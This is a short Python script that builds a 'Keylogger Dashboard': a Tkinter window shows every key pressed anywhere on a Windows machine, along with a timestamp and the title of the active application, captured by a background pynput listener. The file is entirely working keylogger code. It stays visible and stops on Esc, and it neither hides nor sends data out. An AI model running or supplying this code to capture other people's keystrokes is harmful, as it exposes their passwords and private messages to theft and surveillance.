import tkinter as tk
from pynput.keyboard import Key, Listener
from datetime import datetime
import win32gui

# Get active window title
def get_active_window():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

# Setup GUI
root = tk.Tk()
root.title("Keylogger Dashboard")
root.geometry("600x400")

text_area = tk.Text(root, wrap=tk.WORD, font=("Segoe UI", 10))
text_area.pack(expand=True, fill=tk.BOTH)

scrollbar = tk.Scrollbar(text_area)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
text_area.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=text_area.yview)

# Key press handler
def on_key_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_str = str(key).replace("'", "")
    if "Key" in key_str:
        key_str = f"[{key_str}]"
    active_app = get_active_window()
    log_line = f"{timestamp} | App: {active_app} | Key: {key_str}\n"
    text_area.insert(tk.END, log_line)
    text_area.see(tk.END)  # Auto-scroll

# Stop on Esc
def on_release(key):
    if key == Key.esc:
        root.quit()
        return False

# Start listener in background
def start_listener():
    with Listener(on_press=on_key_press, on_release=on_release) as listener:
        listener.join()

import threading
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()

# Run the GUI
root.mainloop()